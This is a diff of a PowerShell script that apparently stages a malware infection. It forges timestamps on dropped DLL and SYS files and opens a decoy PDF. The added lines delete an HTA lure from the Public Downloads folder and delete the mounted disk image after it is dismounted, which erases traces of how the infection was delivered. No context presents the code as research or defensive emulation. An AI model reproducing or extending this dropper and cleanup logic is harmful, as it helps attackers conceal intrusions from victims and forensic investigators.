@@ -33,6 +33,12 @@ function Apply-StampTimes {
 }
 
 Start-Sleep -Seconds 5
+
+$htaPath = Join-Path $env:PUBLIC 'Downloads\DocShare.hta'
+if (Test-Path -LiteralPath $htaPath) {
+    Remove-Item -LiteralPath $htaPath -Force -ErrorAction SilentlyContinue
+}
+
 $deadline = (Get-Date).AddSeconds(45)
 
 do {
@@ -56,7 +62,7 @@ do {
         Copy-Item -LiteralPath $pdfSrc -Destination $pdfDst -Force -ErrorAction Stop
     } catch { }
 
-    Apply-StampTimes -Paths @($pdfDst, $imgDst, $dllDrop, $sysDrop)
+    Apply-StampTimes -Paths @($pdfDst, $dllDrop, $sysDrop)
 
     try {
         $shell = New-Object -ComObject Shell.Application
@@ -73,6 +79,9 @@ do {
     Start-Sleep -Milliseconds 500
     try {
         Get-DiskImage -Volume $v -ErrorAction Stop | Dismount-DiskImage -ErrorAction Stop
+        if (Test-Path -LiteralPath $imgDst) {
+            Remove-Item -LiteralPath $imgDst -Force -ErrorAction SilentlyContinue
+        }
         if (Test-Path -LiteralPath $pdfDst) {
             Start-Process -FilePath $pdfDst
         }
